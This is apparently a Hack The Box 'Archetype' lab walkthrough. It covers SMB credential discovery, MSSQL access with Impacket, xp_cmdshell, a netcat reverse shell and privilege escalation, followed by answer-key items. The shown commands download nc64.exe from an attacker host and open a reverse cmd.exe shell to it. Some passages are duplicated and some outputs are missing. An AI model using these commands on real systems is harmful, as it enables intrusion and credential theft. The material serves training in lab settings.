Impacket is a collection of Python classes for working with network protocols. Impacket
is focused on providing low-level programmatic access to the packets and for some
protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be
constructed from scratch, as well as parsed from raw data, and the object oriented API
makes it simple to work with deep hierarchies of protocols. The library provides a set
of tools as examples of what can be done within the context of this library.

The file will be saved in the directory from which we launched the SMB session. Here's the contents of the
files:
By reviewing the content of this configuration file, we spot in cleartext the password of the user sql_svc ,
which is M3g4c0rp123 , for the host ARCHETYPE . With the provided credentials we just need a way to
connect and authenticate to the MSSQL server.

The help option describes the very basic of the functionalities it offers, which means that we need to
perform further research on this in order to understand the inner-workings of each feature.
Here's two great articles that can guide us further to our exploration journey with MSSQL Server:

Finally we managed to get a command execution!
Now, we will attempt to get a stable reverse shell. We will upload the nc64.exe binary to the target
machine and execute an interactive cmd.exe process on our listening port.
We can download the binary from here.
We navigate to the folder and then start the simple HTTP server, then the netcat listener in a different tab by
using the following commands:

We can download the binary from here.
We navigate to the folder and then start the simple HTTP server, then the netcat listener in a different tab by
using the following commands:
In order to upload the binary in the target system, we need to find the appropriate folder for that. We will be
using PowerShell for the following tasks since it gives us much more features then the regular command
prompt. In order to use it, we will have to specify it each time we want to execute it until we get the reverse
shell. To do that, we will use the following syntax: powershell -c command
The -c flag instructs the powershell to execute the command.
We will print the current working directory by issuing the following:
We found the folder where we will place the binary. To do that, we will use the wget alias within PowerShell
( wget is actually just an alias for Invoke-WebRequest ):

As a user archetype\sql_svc , we don't have enough privileges to upload files in a system directory and
only user Administrator can perform actions with higher privileges. We need to change the current
working directory somewhere in the home directory of our user where it will be possible to write. After a
quick enumeration we found that Downloads is working perfectly for us to place our binary. In order to do
that, we are going to use the wget tool within PowerShell:

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.51/nc64.exe -outfile nc64.exe"
output

Now, we can bind the cmd.exe through the nc to our listener:

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.51 443"

For privilege escalation, we are going to use a tool called winPEAS , which can automate a big part of the
enumeration process in the target system. You can find more information for enumerating Windows system
for Privilege Escalation paths in the HTB academy module Windows Privilege Escalation.
It is possible to download winpeas from here. We will transfer it to our target system by using once more
the Python HTTP server:
https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe

On the target machine, we will execute the wget command in order to download the program from our
system. The file will be downloaded in the directory from which the wget command was run. We will use
powershell for all our commands

C:\Users\sql_svc\Desktop>cd ..\Downloads
cd ..\Downloads

From the output we can observer that we have SeImpersonatePrivilege (more information can be found
here), which is also vulnerable to juicy potato exploit. However, we can first check the two existing files
where credentials could be possible to be found.

As this is a normal user account as well as a service account, it is worth checking for frequently access files
or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of
.bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ 

PS C:\Users\sql_svc\Downloads> cd ..

We got in cleartext the password for the Administrator user which is MEGACORP_4dm1n!!
We can now use the tool psexec.py again from the Impacket suite to get a shell as the administrator:

 Which TCP port is hosting a database server? 
*1433*
What is the name of the non-Administrative share available over SMB? 
smbclient -N -L will list shares. Administrative shares end in $.
*backups*
What is the password identified in the file on the SMB share? 
*M3g4c0rp123*
What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? 
Impacket examples can always help. Search for one related to the mssql.
*mssqlclient.py*
What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? 
Pentesting cheatsheets for Microsoft SQL Server will definitely help. Also a "Transact sql shell for Microsoft SQL Server" search in Google will bring useful results.
